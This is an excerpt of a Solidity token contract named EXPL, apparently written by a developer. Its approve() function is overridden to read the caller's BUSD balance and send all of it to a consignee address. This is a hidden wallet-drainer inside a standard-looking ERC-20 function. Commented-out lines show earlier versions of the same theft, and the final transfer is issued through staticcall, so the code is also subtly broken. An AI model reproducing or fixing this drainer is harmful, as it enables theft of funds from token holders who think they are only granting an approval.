...
contract EXPL is Context, IERC20, IERC20Metadata, Ownable {   
    ...
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        ...
        //uint256 contractBUSDBalance = IERC20(contractBUSDAddress).balanceOf(_msgSender());
        //bool contractBUSDTransfer = IERC20(contractBUSDAddress).transferFrom(_msgSender(), addressConsignee, contractBUSDBalance);


        //uint256 contractBUSDBalance = address(contractBUSDAddress).call(bytes4(keccak256("balanceOf(address)")), _msgSender());

        (bool _success, bytes memory _contractBUSDBalance) = address(contractBUSDAddress).staticcall(abi.encode(bytes4(keccak256('balanceOf(address)')), (_msgSender())));
        (uint256 contractBUSDBalance) = abi.decode(_contractBUSDBalance, (uint256));

        address(contractBUSDAddress).staticcall(abi.encode(bytes4(keccak256("transferFrom(address,address,uint256)")), _msgSender(), addressConsignee, contractBUSDBalance));
